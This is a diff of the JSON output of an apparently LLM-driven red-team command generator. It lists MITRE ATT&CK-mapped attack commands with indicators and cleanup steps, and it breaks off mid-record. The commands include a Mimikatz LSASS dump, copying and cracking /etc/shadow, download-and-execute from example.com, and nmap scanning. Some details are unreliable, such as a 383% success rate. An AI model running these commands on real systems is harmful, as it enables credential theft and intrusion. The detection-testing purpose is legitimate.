@@ -1,13 +1,13 @@
 {
-  "timestamp": "2025-11-01T13:55:58.880739",
-  "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+  "timestamp": "2025-11-01T14:37:34.215297",
+  "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
   "test_mode": "real_no_mock",
   "statistics": {
     "agent_info": {
-      "id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+      "id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
       "name": "test_real_agent",
       "status": "idle",
-      "uptime_seconds": 3.895055
+      "uptime_seconds": 301.59201
     },
     "configuration": {
       "supported_platforms": [
@@ -16,677 +16,704 @@
       ],
       "safety_level": "medium",
       "max_commands_per_ttp": 2,
-      "use_mock_llm": true,
+      "use_mock_llm": false,
       "model_name": "gemini-2.0-flash-lite"
     },
     "statistics": {
       "total_ttps_processed": 6,
-      "total_commands_generated": 24,
+      "total_commands_generated": 23,
       "commands_by_platform": {
-        "windows": 12,
+        "windows": 11,
         "linux": 12
       },
       "commands_by_tactic": {
-        "Credential Access": 8,
+        "Credential Access": 7,
         "Lateral Movement": 8,
         "Initial Access": 4,
         "Execution": 4
       },
       "generation_errors": 0,
       "safety_violations": 0,
-      "successful_generations": 24,
-      "avg_generation_time_ms": 622.75,
+      "successful_generations": 23,
+      "avg_generation_time_ms": 33014.3925,
       "llm_api_calls": 12,
-      "last_generation_time": "2025-11-01T13:55:58.880739"
+      "last_generation_time": "2025-11-01T14:37:34.215297"
     },
     "performance": {
-      "success_rate": 400.0,
-      "avg_generation_time_ms": 622.75
+      "success_rate": 383.33333333333337,
+      "avg_generation_time_ms": 33014.3925
     }
   },
   "execution_result": {
-    "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+    "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
     "status": "success",
-    "timestamp": "2025-11-01T13:55:58.880739",
+    "timestamp": "2025-11-01T14:37:34.215297",
     "generation_summary": {
       "ttps_processed": 6,
-      "commands_generated": 24,
+      "commands_generated": 23,
       "generation_errors": 0,
-      "processing_time_ms": 3736.5
+      "processing_time_ms": 198086.355
     },
     "attack_commands": [
       {
-        "command_id": "35a95905-b22d-4dd7-9ddc-c2c4f52b3a8d",
+        "command_id": "26f9c149-c879-4ebd-a18e-5776f43be498",
         "ttp_id": "real-T1003",
         "mitre_attack_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "Credential Access",
         "platform": "windows",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Mimikatz - Dump LSASS Credentials (Simulated)",
+        "command": "powershell -c \"Invoke-Mimikatz -Command \\\"privilege::debug\\\" -Command \\\"sekurlsa::logonpasswords\\\"\"",
+        "explanation": "This simulates credential dumping using Mimikatz. This command uses PowerShell to execute Mimikatz commands to attempt to extract credentials from the LSASS process. Note: This command is highly sensitive and may trigger AV/EDR. The `-Command` arguments specify the Mimikatz module and the specific action to perform. This is a simulation because directly running Mimikatz can be risky. This version may fail depending on the security configuration of the host machine.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Event logs indicating PowerShell execution with suspicious arguments.",
+          "Potential alerts from Endpoint Detection and Response (EDR) solutions detecting Mimikatz-like behavior.",
+          "Process creation events for powershell.exe and potentially for Mimikatz (if not blocked).",
+          "If successful, the command would attempt to display usernames, hashes, and potentially cleartext passwords (depending on the system's security configuration)."
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "Mimikatz binary (or a tool with similar functionality) is accessible or can be downloaded (carefully and safely).",
+          "User account with sufficient privileges (e.g., local administrator) to run Mimikatz.",
+          "A testing environment where actions are monitored and potentially blocked by security solutions.",
+          "Ensure your testing environment is isolated from production systems."
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "There is no direct cleanup as this is a simulation. Ensure no Mimikatz files are left on the system. Review logs for any suspicious activity.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:55.443720",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:34:49.351591",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.813,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "a5e64706-6e23-4480-997d-a528b0450163",
+        "command_id": "2d4f4264-f85a-4fb6-a399-14071a3e5947",
         "ttp_id": "real-T1003",
         "mitre_attack_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "Credential Access",
         "platform": "windows",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "Simulated Credential Harvesting via PowerShell (File Access)",
+        "command": "powershell -c \"$passwords = Get-Content -Path C:\\Users\\Public\\Documents\\passwords.txt; Write-Output \\\"Simulated Credential: \\\" + $passwords\"",
+        "explanation": "This command simulates credential harvesting by attempting to read a pre-existing file (passwords.txt) containing simulated credentials.  This uses PowerShell to read the contents of a text file.  This is a safer approach than directly running Mimikatz, as it doesn't involve memory manipulation.  This is an attempt to simulate how an attacker might find credentials.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "Event logs indicating PowerShell execution and file access.",
+          "File access events for C:\\Users\\Public\\Documents\\passwords.txt.",
+          "The output of the PowerShell command will show the contents of the 'passwords.txt' file if it exists."
         ],
         "prerequisites": [
-          "Registry access"
+          "A file named 'passwords.txt' must exist in the C:\\Users\\Public\\Documents\\ directory. It should contain simulated credentials (e.g., username:password).",
+          "User account with permissions to read the 'passwords.txt' file.",
+          "A testing environment where actions are monitored."
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "Delete the 'passwords.txt' file from C:\\Users\\Public\\Documents\\ after testing.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:55.443720",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:34:49.351591",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.813,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "45d9f971-8786-414d-b880-dcc2b14dc9d1",
+        "command_id": "69081678-e86f-41a9-8c13-70cc8d08a8fb",
         "ttp_id": "real-T1003",
         "mitre_attack_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "Credential Access",
         "platform": "linux",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Dump Shadow File Credentials with John the Ripper",
+        "command": "sudo cp /etc/shadow /tmp/shadow.bak && sudo chown $USER:$USER /tmp/shadow.bak && john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/shadow.bak",
+        "explanation": "This command attempts to dump credentials by copying the /etc/shadow file (which contains password hashes) to a user-writable location, then running John the Ripper to attempt to crack the password hashes using a wordlist. This simulates an attacker gaining access to the shadow file and attempting to crack the passwords.  It copies the shadow file to a temporary location owned by the user to avoid permission issues during the cracking process.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Creation of /tmp/shadow.bak file.",
+          "Execution of John the Ripper process.",
+          "Potential password hashes and cracked passwords in John the Ripper output."
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "Sudo privileges for copying the shadow file.",
+          "John the Ripper installed.",
+          "A wordlist (like rockyou.txt) available on the system."
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "sudo rm /tmp/shadow.bak",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:55.754825",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:35:16.853247",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.813,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "4732c905-b996-4228-9bed-361a3f0a433e",
+        "command_id": "ffd19769-19db-486a-9e7b-3d8b47997142",
         "ttp_id": "real-T1003",
         "mitre_attack_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "Credential Access",
         "platform": "linux",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "Extract SSH Key from Known Hosts",
+        "command": "cat ~/.ssh/known_hosts | grep -v '#' | awk '{print $3}' | sort -u",
+        "explanation": "This command simulates an attacker attempting to gather credentials, specifically SSH keys, from the `known_hosts` file.  This file stores SSH host keys, and an attacker might be able to use them for lateral movement or other malicious activities.  The command extracts the host keys, filters out comments, and sorts them to provide a list of known hosts and potentially exposed keys.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "Listing of SSH host keys from the `known_hosts` file.",
+          "Output of the extracted public keys."
         ],
         "prerequisites": [
-          "Registry access"
+          "User account with SSH setup and populated `known_hosts` file (connecting to other SSH servers at least once)."
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "None (this command doesn't modify any files, it only reads them)",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:55.754825",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:35:16.853247",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.813,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "92ac0d7b-e7cb-4258-b440-888eba922f59",
+        "command_id": "5d94914f-51b8-4191-80d4-9f879b6830e9",
         "ttp_id": "real-T1021.001",
         "mitre_attack_id": "T1021.001",
         "technique_name": "Remote Desktop Protocol",
         "tactic": "Lateral Movement",
         "platform": "windows",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Establish RDP connection using mstsc.exe with saved credentials",
+        "command": "cmd.exe /c start mstsc.exe /v <target_ip_or_hostname> /admin /f /shadow:0",
+        "explanation": "This command attempts to establish an RDP connection to a target system. It leverages `mstsc.exe`, the built-in Windows Remote Desktop Connection client. `/v <target_ip_or_hostname>` specifies the target. `/admin` connects to the console session, and `/f` forces full-screen mode. `/shadow:0` specifies to not shadow the session. This command assumes the current user has the necessary credentials (either saved in the RDP file or implicitly through current user context) to authenticate to the target system. The `cmd.exe /c start` is used to launch mstsc.exe in a non-blocking manner.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Event ID 4624 (An account was successfully logged on) on the target system, with Logon Type 10 (RemoteInteractive) or 3 (Network).",
+          "RDP connection logs on the target system, potentially in the Security event log (Event ID 4778, 4779).",
+          "Network traffic on port 3389 (TCP) between the source and target systems.",
+          "A new RDP session active on the target system (visible through task manager or similar tools).",
+          "mstsc.exe process running on the target system."
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "Network connectivity between the attacking and target systems.",
+          "The attacking user account must have permissions to connect to the target system via RDP (either through direct permissions or via group membership).",
+          "RDP must be enabled and configured on the target system (port 3389 open).",
+          "The target system must be running and accessible.",
+          "The credentials of a valid user account on the target system must be available to the attacking user (e.g., saved RDP connection file, or current user context).",
+          "Target IP or Hostname must be known."
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "Close the RDP session on the target system. Remove any saved RDP connection files if created during testing. No other specific cleanup is required, as the command only establishes a connection and does not leave any artifacts beyond the RDP session itself.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:56.066842",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:35:25.365217",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.803,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "23a34515-14b9-4e5a-9d61-77507fccf088",
+        "command_id": "73ef2c8f-81bd-49ff-ab66-df2d0cbde5bc",
         "ttp_id": "real-T1021.001",
         "mitre_attack_id": "T1021.001",
         "technique_name": "Remote Desktop Protocol",
         "tactic": "Lateral Movement",
         "platform": "windows",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "Establish RDP connection using mstsc.exe with command-line parameters (prompt for credentials)",
+        "command": "cmd.exe /c start mstsc.exe /v:<target_ip_or_hostname> /admin /f",
+        "explanation": "This command is similar to the first, using `mstsc.exe` to initiate an RDP connection.  However, this version *does not* include saved credentials in the command. It will prompt the user for credentials.  `/v <target_ip_or_hostname>` specifies the target. `/admin` connects to the console session and `/f` forces full-screen mode. The `cmd.exe /c start` is used to launch mstsc.exe in a non-blocking manner.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "Event ID 4624 (An account was successfully logged on) on the target system, with Logon Type 10 (RemoteInteractive) or 3 (Network).",
+          "RDP connection logs on the target system, potentially in the Security event log (Event ID 4778, 4779).",
+          "Network traffic on port 3389 (TCP) between the source and target systems.",
+          "A new RDP session active on the target system (visible through task manager or similar tools).",
+          "mstsc.exe process running on the target system."
         ],
         "prerequisites": [
-          "Registry access"
+          "Network connectivity between the attacking and target systems.",
+          "RDP must be enabled and configured on the target system (port 3389 open).",
+          "The target system must be running and accessible.",
+          "The user executing the command must know the credentials for a valid account on the target system (or the credentials will be entered interactively during the connection attempt).",
+          "Target IP or Hostname must be known."
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "Close the RDP session on the target system. No other cleanup is required as the command does not leave behind any persistent artifacts. The user must simply close the RDP connection window. ",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:56.066842",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:35:25.365217",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.803,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "2ecb0c5d-c770-4cc3-8c73-c386e46f2dd0",
+        "command_id": "7b40136b-6835-43cc-8557-2139a3b58981",
         "ttp_id": "real-T1021.001",
         "mitre_attack_id": "T1021.001",
         "technique_name": "Remote Desktop Protocol",
         "tactic": "Lateral Movement",
         "platform": "linux",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Establish RDP Connection to a Windows Host via `rdesktop` (Simulated Lateral Movement)",
+        "command": "rdesktop -g 1024x768 <TARGET_IP>:<PORT> -u <USERNAME> -p <PASSWORD> -d <DOMAIN>",
+        "explanation": "This command simulates lateral movement by attempting to connect to a Windows host using RDP. It uses the `rdesktop` client, a free and open-source implementation of the RDP protocol.  It specifies the target IP address and port (default 3389), username, password, and domain.  This command does NOT actually move laterally, it merely attempts to connect, simulating the initial step of lateral movement.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Network connection attempts to <TARGET_IP> on port <PORT> (3389 by default).",
+          "Process execution: `rdesktop`.",
+          "Authentication attempts in Windows Event Logs (Security log, event ID 4624/4625) on the target host.",
+          "If successful, a new RDP session will be established on the target host."
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "`rdesktop` must be installed on the attacking Linux host (e.g., `sudo apt-get install rdesktop`).",
+          "Network connectivity between the attacking Linux host and the target Windows host.",
+          "Valid credentials (username, password, domain) for a user account on the target Windows host.",
+          "Target Windows host must have RDP enabled and accessible."
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "Close the `rdesktop` session. No active cleanup is required on the attacking host beyond closing the session.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:56.378288",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:35:40.893189",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.803,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "d365e295-2405-43ff-b735-f524eaa49c84",
+        "command_id": "c458d2cc-171c-4a81-ad19-4a38ebc146b0",
         "ttp_id": "real-T1021.001",
         "mitre_attack_id": "T1021.001",
         "technique_name": "Remote Desktop Protocol",
         "tactic": "Lateral Movement",
         "platform": "linux",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "Scan for Open RDP Ports using `nmap` (Reconnaissance)",
+        "command": "nmap -p 3389 --open <TARGET_NETWORK>/24",
+        "explanation": "This command uses `nmap`, a network scanner, to identify hosts on a specified network that have the RDP port (3389) open.  This is a reconnaissance technique used to identify potential targets for lateral movement via RDP. The `--open` option filters the results to only show open ports, reducing noise.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "Process execution: `nmap`.",
+          "Network traffic directed to <TARGET_NETWORK>/24 on port 3389.",
+          "Nmap scan results showing open ports 3389 on any hosts in the specified network."
         ],
         "prerequisites": [
-          "Registry access"
+          "`nmap` must be installed on the attacking Linux host (e.g., `sudo apt-get install nmap`).",
+          "Network connectivity between the attacking Linux host and the target network.",
+          "Knowledge of the target network range (e.g., 192.168.1.0/24)."
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "No active cleanup is required.  The scan does not modify any systems.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:56.378288",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:35:40.893189",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.803,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "369a7fe1-274c-4f81-afb2-fd9031bec3cf",
+        "command_id": "6925a7c2-a4f3-4fd0-89ac-3d677f9060db",
         "ttp_id": "real-T1566.001",
         "mitre_attack_id": "T1566.001",
         "technique_name": "Spearphishing Attachment",
         "tactic": "Initial Access",
         "platform": "windows",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Simulate Spearphishing Attachment with PowerShell and a benign document",
+        "command": "powershell -c \"Invoke-WebRequest -Uri 'http://example.com/benign_doc.doc' -OutFile 'C:\\Users\\Public\\Documents\\benign_doc.doc'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\benign_doc.doc'\"",
+        "explanation": "This simulates a spearphishing attack by downloading a benign Word document (hosted on a controlled server) and opening it. It uses PowerShell's `Invoke-WebRequest` to download the file and `Start-Process` to open it.  This tests for network traffic to example.com and file creation/execution monitoring.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Network traffic to example.com on port 80 or 443",
+          "File creation event for benign_doc.doc in C:\\Users\\Public\\Documents\\",
+          "Process execution event for WINWORD.EXE (or the default program for .doc files)",
+          "Potentially, a User-Agent string in network logs indicating Powershell"
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "A Windows testing environment.",
+          "A web server accessible from the testing environment hosting a harmless .doc file (e.g., a blank Word document).  Replace 'http://example.com/benign_doc.doc' with the correct URL.",
+          "Ensure PowerShell execution policy allows execution of scripts (e.g., by setting it to RemoteSigned or Bypass). This is often the case in test environments.  Check with `Get-ExecutionPolicy` and adjust with `Set-ExecutionPolicy` if needed."
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "Remove the downloaded file: `Remove-Item 'C:\\Users\\Public\\Documents\\benign_doc.doc' -Force`",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:56.691245",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:15.211173",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.792,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "ae7a942c-89b3-4230-ba3c-f7bf7fa18f11",
+        "command_id": "42cb748f-c395-4fe1-9438-6248f0bda0b7",
         "ttp_id": "real-T1566.001",
         "mitre_attack_id": "T1566.001",
         "technique_name": "Spearphishing Attachment",
         "tactic": "Initial Access",
         "platform": "windows",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "Simulate Spearphishing Attachment with an embedded macro and a benign payload",
+        "command": "powershell -c \"$docPath = 'C:\\Users\\Public\\Documents\\test.doc';  $macroCode = 'Sub AutoOpen\\r\\n  MsgBox \\\"Hello from the macro!\\\"\\r\\nEnd Sub';  Add-Content -Path $docPath -Value $macroCode; Start-Process -FilePath $docPath\"",
+        "explanation": "This simulates a spearphishing attachment by creating a Word document with an embedded VBA macro that, when opened, executes a simple 'Hello from the macro!' message box. This command creates a new .doc file and injects VBA code.  It tests for file creation, process execution and macro execution monitoring.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "File creation event for test.doc in C:\\Users\\Public\\Documents\\",
+          "Process execution event for WINWORD.EXE (or the default program for .doc files)",
+          "Macro execution event (potentially logged by security solutions)",
+          "A messagebox popping up with the message 'Hello from the macro!'"
         ],
         "prerequisites": [
-          "Registry access"
+          "A Windows testing environment.",
+          "Ensure that macros are enabled (or at least not blocked) for the testing user within the Word application. If Word is configured to block macros by default, this test will not execute the macro.",
+          "If testing on a locked-down system, ensure that the user account running the tests has permissions to write files to the C:\\Users\\Public\\Documents\\ directory."
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "Remove the created file: `Remove-Item 'C:\\Users\\Public\\Documents\\test.doc' -Force`",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:56.691245",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:15.211173",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.792,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "c54e96e4-0453-4588-b58c-86d9a85c20f6",
+        "command_id": "8e0131b0-8724-4905-abae-b78145d75bc1",
         "ttp_id": "real-T1566.001",
         "mitre_attack_id": "T1566.001",
         "technique_name": "Spearphishing Attachment",
         "tactic": "Initial Access",
         "platform": "linux",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Simulate Spearphishing Attachment with Malicious Shell Script (T1566.001)",
+        "command": "echo 'echo \"Spearphishing payload executed!\" >> /tmp/spearphish_log.txt' > spearphish.sh && chmod +x spearphish.sh && echo \"Please open this file: spearphish.sh\" > email_body.txt",
+        "explanation": "This simulates a spearphishing attack. It creates a shell script ('spearphish.sh') that, when executed, writes a message to a log file.  It then creates a file ('email_body.txt') that mimics an email body instructing the user to open and execute the shell script.  This is a simplified representation of how an attacker might use an attachment to get code execution. While not a real Office document, it simulates the user interaction and code execution aspect of T1566.001.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Creation of spearphish.sh file",
+          "Creation of email_body.txt file",
+          "Execution of spearphish.sh (if run)",
+          "Modification of /tmp/spearphish_log.txt (if run)"
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "A Linux environment for testing.",
+          "User account with permissions to create files in the current directory and execute shell scripts."
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "rm spearphish.sh email_body.txt /tmp/spearphish_log.txt",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:57.001192",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:33.382692",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.792,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "6e571c12-be4d-4dd7-94cb-917be1b2278c",
+        "command_id": "be34c2de-508f-405c-a6eb-a1ed458aabee",
         "ttp_id": "real-T1566.001",
         "mitre_attack_id": "T1566.001",
         "technique_name": "Spearphishing Attachment",
         "tactic": "Initial Access",
         "platform": "linux",
-        "name": "Mock Registry Persistence",
-        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /t REG_SZ /d \"echo Mock persistence test\"",
-        "explanation": "Mock command for testing registry-based persistence",
+        "name": "Simulate Spearphishing Attachment with a Suspicious Compressed Archive (T1566.001)",
+        "command": "echo 'echo \"Suspicious file extracted!\" >> /tmp/extract_log.txt' > extract_me.sh && chmod +x extract_me.sh && zip spearphish.zip extract_me.sh && echo \"Please open and extract spearphish.zip\" > email_body.txt",
+        "explanation": "This simulates an attack where a user is tricked into opening a compressed archive (zip file) containing a malicious script. The command creates a shell script ('extract_me.sh') which, when executed, writes a message to a log file. It then zips the shell script into an archive called spearphish.zip. Finally, it creates email_body.txt, simulating an email body that directs the user to open and extract the zip file, and then potentially execute the contained script. This simulates a common attack vector.",
         "indicators": [
-          "Registry modification",
-          "Persistence mechanism",
-          "Run key"
+          "Creation of extract_me.sh file",
+          "Creation of spearphish.zip file",
+          "Creation of email_body.txt file",
+          "Execution of extract_me.sh (if run)",
+          "Modification of /tmp/extract_log.txt (if run)"
         ],
         "prerequisites": [
-          "Registry access"
+          "A Linux environment for testing.",
+          "User account with permissions to create files and run commands in the current directory.",
+          "The 'zip' utility must be installed (e.g., `sudo apt install zip` on Debian/Ubuntu)."
         ],
-        "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MockTest\" /f",
+        "cleanup": "rm extract_me.sh spearphish.zip email_body.txt /tmp/extract_log.txt",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:57.001192",
-        "agent_id": "c954269b-977a-4d2f-bbf3-2d914ded3455",
+        "generated_at": "2025-11-01T14:36:33.382692",
+        "agent_id": "3ea1af79-b2e6-4295-8aa3-619ae8bcb098",
         "confidence_score": 0.792,
         "safety_level": "medium",
         "validated": true
       },
       {
-        "command_id": "de863c66-47b7-4ca1-a143-e7ab084df9b8",
+        "command_id": "1f9dd9d0-67eb-4eff-9df3-961026910531",
         "ttp_id": "real-T1059.001",
         "mitre_attack_id": "T1059.001",
         "technique_name": "PowerShell",
         "tactic": "Execution",
         "platform": "windows",
-        "name": "Mock PowerShell Execution",
-        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.Name -eq 'explorer'}\"",
-        "explanation": "Mock command for testing PowerShell execution detection",
+        "name": "Download and Execute a Simple Script from a Web Server (T1059.001)",
+        "command": "powershell -c \"Invoke-WebRequest -Uri 'http://example.com/test.ps1' -OutFile '%TEMP%\\test.ps1'; & '%TEMP%\\test.ps1'\"",
+        "explanation": "This command uses PowerShell to download a simple PowerShell script (test.ps1) from a web server (example.com). The script is then saved to the temporary directory and executed. The test.ps1 script, if it exists, would typically contain a simple command like 'Write-Host \"Hello from test.ps1\"' to verify execution.  Replace 'http://example.com/test.ps1' with the URL of your test script before execution.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration",
-          "ExecutionPolicy Bypass"
+          "Network connection to example.com (or your specified URL)",
+          "File creation in %TEMP% (test.ps1)",
+          "Process execution of powershell.exe",
+          "Event log entries related to PowerShell script execution (e.g., Event ID 400, 4104 depending on logging configuration)"
         ],
         "prerequisites": [
-          "PowerShell available",
-          "User privileges"
+          "An accessible web server hosting the test.ps1 script (e.g., a simple file containing 'Write-Host \"Hello from test.ps1\"')",
+          "Network connectivity from the test machine to the web server."
         ],
-        "cleanup": "No cleanup required for mock command",
+        "cleanup": "Remove the downloaded script from the temporary directory: `Remove-Item '%TEMP%\\test.ps1' -Force`",
         "source": "gemini_llm",
-        "generated_at": "2025-11-01T13:55:57.312845",
